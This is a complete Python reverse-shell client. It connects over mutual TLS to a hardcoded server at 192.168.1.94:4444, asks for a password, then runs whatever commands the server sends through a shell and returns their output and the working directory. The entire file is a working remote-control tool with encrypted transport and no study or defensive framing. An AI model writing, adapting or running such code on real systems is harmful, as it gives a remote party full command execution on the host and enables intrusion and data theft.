#!/usr/bin/env python3

"""
Secure Reverse Shell Client with Mutual TLS and Password Auth
"""
import socket
import ssl
import os
import subprocess
import sys
import getpass

# Server configuration
SERVER_IP   = "192.168.1.94"
SERVER_PORT = 4444

# Paths to certificates/keys
CA_FILE     = "certs/ca.crt"
CLIENT_CERT = "certs/client.crt"
CLIENT_KEY  = "certs/client.key"

def create_client_context(ca_file, cert_file, key_file):
    """
    Client-side TLS context:
    - Purpose.SERVER_AUTH validates the server cert.
    - cafile ensures we only trust certs signed by our CA.
    - load_cert_chain presents our client cert & key.
    """
    ctx = ssl.create_default_context(
        ssl.Purpose.SERVER_AUTH,
        cafile=ca_file
    )
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    
    return ctx

def authenticate(sock):
    """
    Perform password-based authentication over the encrypted channel.
    """
    try:
        password = getpass.getpass("Enter password: ")
        sock.sendall(password.encode('utf-8'))
        result = sock.recv(1024).decode('utf-8')
        if result.strip() == "AUTH_SUCCESS":
            print("[+] Authentication successful")
            return True
        else:
            print("[-] Authentication failed")
            return False
    except Exception as e:
        print(f"[!] Authentication error: {e}")
        return False

def main():
    # Build TLS context and wrap socket
    context = create_client_context(CA_FILE, CLIENT_CERT, CLIENT_KEY)
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Pass server_hostname for SNI and hostname verification
    tls_sock = context.wrap_socket(
        raw_sock,
        server_hostname=SERVER_IP
    )

    # Connect (performs TLS handshake)
    try:
        tls_sock.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT} over TLS")
    except Exception as e:
        sys.exit(f"Connection failed: {e}")

    # Password authentication
    if not authenticate(tls_sock):
        tls_sock.close()
        sys.exit(1)

    # Command loop
    while True:
        try:
            data = tls_sock.recv(1024)
            if not data:
                print("[*] Server closed the connection.")
                break

            command = data.decode("utf-8", errors="ignore")

            if command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    output = ""
                except OSError as e:
                    output = f"cd error: {e}\n"
            else:
                proc = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                stdout, stderr = proc.communicate()
                output = stdout.decode() + stderr.decode()

            # Append prompt
            output += os.getcwd() + "> "
            tls_sock.sendall(output.encode("utf-8"))

        except Exception as e:
            tls_sock.sendall(f"Error: {e}\n".encode("utf-8"))
            break

    tls_sock.close()

if __name__ == '__main__':
    main()
